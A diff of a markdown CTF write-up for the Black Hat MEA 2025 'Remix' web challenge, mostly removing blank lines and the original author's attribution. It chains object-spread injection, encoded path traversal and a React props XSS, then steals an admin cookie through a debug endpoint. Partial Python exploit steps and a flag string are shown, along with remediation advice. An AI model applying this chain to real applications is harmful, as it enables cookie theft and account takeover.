@@ -1,35 +1,26 @@
 # :globe_with_meridians: Remix - Black Hat MEA Finals CTF 2025 Web Challenge Writeup
 
-> **Original Source:** [Remix - Black Hat MEA Finals CTF 2025 Web Challenge Writeup](https://0x-professor.medium.com/remix-black-hat-mea-finals-ctf-2025-web-challenge-writeup-b3aaeb35ae5f)
-> **Platform:** 0x-professor.medium.com | **Category:** `WEB` | **Year:** 2025
-
 ---
 
 # Remix — Black Hat MEA Finals CTF 2025 Web Challenge Writeup
-
 
 *A deep dive into chaining Next.js vulnerabilities for XSS and cookie exfiltration*
 
 ## Introduction
 
-
 During the Black Hat MEA Finals CTF 2025 held in Riyadh (December 2, 2025), I tackled “Remix,” a challenging web security problem that required chaining multiple vulnerabilities in a Next.js application. This writeup documents my exploitation approach and the technical insights I gained.
 
 ## Challenge Overview
-
 
 Challenge: Remix
 Category: Web
 Flag: `BHFlagY{00b76481b000f5448858f72a3990bf79}`
 
-
 The challenge presented a Next.js music remix sharing application with a bot component that visits user-submitted URLs. The goal was to exploit vulnerabilities to exfiltrate the admin’s flag cookie.
 
 ## Initial Reconnaissance
 
-
 After examining the challenge environment, I identified:
-
 
 - Frontend/Backend: Next.js 15.5.6 with React 19.1.0
 
@@ -37,19 +28,15 @@ After examining the challenge environment, I identified:
 
 - Sandboxing: nsjail with `--disable_clone_newnet` (shared network namespace)
 
-
 The shared network configuration was crucial it meant the bot could access internal API endpoints, but outbound internet connections were blocked. This constraint would shape my exfiltration strategy.
 
 ## Vulnerability Discovery
-
 
 I discovered four distinct vulnerabilities that could be chained together:
 
 ## 1. Object Spread Injection in API Endpoint
 
-
 While analyzing `/api/interactions.ts`, I found dangerous user input handling:
-
 
 ```
 const interaction: Interaction = {
@@ -60,14 +47,11 @@ date: new Date().toISOString(),
 };
 ```
 
-
 This pattern allows attackers to inject arbitrary properties beyond the intended `remixId` and `content` fields. I could inject properties like `isDraft` and `draft` that would be stored with the interaction object.
 
 ## 2. Path Traversal via URL Encoding
 
-
 The remix viewing page had an interesting URL handling pattern in `/pages/remix/[id].tsx`:
-
 
 ```
 useEffect(() => {
@@ -81,9 +65,7 @@ const response = await fetch(`/api/remixes/${slug}`);
 };
 ```
 
-
 The vulnerability chain works as follows:
-
 
 - Visiting `/remix/..%2Finteractions%2F123`
 
@@ -95,14 +77,11 @@ The vulnerability chain works as follows:
 
 - Browser path normalization resolves this to `/api/interactions/123`
 
-
 This allowed me to force the page to load interaction data as if it were remix data a critical type confusion vulnerability.
 
 ## 3. Dangerous Object Spread to DOM
 
-
 The remix display component had a seemingly innocent draft preview feature:
-
 
 ```
 {remix.isDraft && (
@@ -113,31 +92,24 @@ The remix display component had a seemingly innocent draft preview feature:
 )}
 ```
 
-
 When `isDraft` is true, the entire `draft` object gets spread as props onto the button element. React's `dangerouslySetInnerHTML` is just another prop if I could inject it via the `draft` object, I would achieve XSS despite React's built-in protections.​
 
 ## 4. Internal Exfiltration via Debug API
 
-
 With outbound connections blocked, I needed a creative exfiltration method. The debug endpoint at `/api/debug/mkdir.ts` provided the solution:
-
 
 ```
 const targetPath = path.join('/tmp', folderPath);
 fs.mkdirSync(targetPath, { recursive: true });
 ```
 
-
 This endpoint creates directories in `/tmp` with user-controlled names. By encoding the cookie value into the directory name, I could store the flag in the filesystem, then retrieve it using the companion `/api/debug/ls` endpoint.
 
 ## Exploitation Methodology
 
-
 ## Step 1: Setting Up the Attack Environment
 
-
 First, I registered an attacker account to interact with the API:
-
 
 ```
 import requests
@@ -153,12 +125,9 @@ session.post(f"{BASE_URL}/api/auth/register", json={
 })
 ```
 
-
 ## Step 2: Crafting the Malicious Payload
 
-
 I constructed an XSS payload that would exfiltrate cookies via the internal debug API:
-
 
 ```
 # XSS payload that exfiltrates cookies using internal API
@@ -189,12 +158,9 @@ interaction_id = response.json()['id']
 print(f"Created malicious interaction: {interaction_id}")
 ```
 
-
 ## Step 3: Triggering the Exploit Chain
 
-
 With the malicious interaction created, I used the path traversal vulnerability to trick the bot:
-
 
 ```
 # Construct path traversal URL (vulnerability #2)
@@ -209,12 +175,9 @@ session.post(f"{BASE_URL}/api/bot", json={
 })
 ```
 
-
 ## Step 4: Retrieving the Exfiltrated Flag
 
-
 After waiting a few seconds for the bot to execute, I queried the debug endpoint:
-
 
 ```
 import time
@@ -232,12 +195,9 @@ flag = dir_name.replace("EXFIL_FLAG_", "FLAG{").replace("_", "")
 print(f"Flag found: {flag}")
 ```
 
-
 ## Attack Flow Visualization
 
-
 The complete attack chain flows through these stages:
-
 
 ```
 ┌─────────────────────────────────────────────────────────────────────┐
@@ -283,15 +243,11 @@ The complete attack chain flows through these stages:
 └─────────────────────────────────────────────────────────────────────┘
 ```
 
-
 ## Remediation Recommendations
-
 
 Based on this exploit, I recommend the following security improvements:
 
-
 - Input Validation: Implement strict allowlisting for API inputs
-
 
 ```
 const allowedFields = ['remixId', 'content'];
@@ -299,7 +255,6 @@ const sanitized = Object.keys(req.body)
 .filter(key => allowedFields.includes(key))
 .reduce((obj, key) => ({ ...obj, [key]: req.body[key] }), {});
 ```
-
 
 - Remove Debug Endpoints: Disable or remove debug/administrative endpoints in production environments
 
@@ -311,16 +266,10 @@ const sanitized = Object.keys(req.body)
 
 ## Conclusion
 
-
 The Remix challenge from Black Hat MEA Finals CTF 2025 demonstrated how modern web frameworks’ convenience features can introduce subtle security vulnerabilities. By chaining object injection, path traversal, React XSS, and creative exfiltration techniques, I successfully captured the flag.​
 
-
 This challenge reinforced the importance of understanding both the security model of your frameworks and how different components interact vulnerabilities often exist at the boundaries between systems.
-
 
 Flag: `BHFlagY{00b76481b000f5448858f72a3990bf79}`
 
 ---
-
-*Originally published on [Medium](https://0x-professor.medium.com/remix-black-hat-mea-finals-ctf-2025-web-challenge-writeup-b3aaeb35ae5f). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
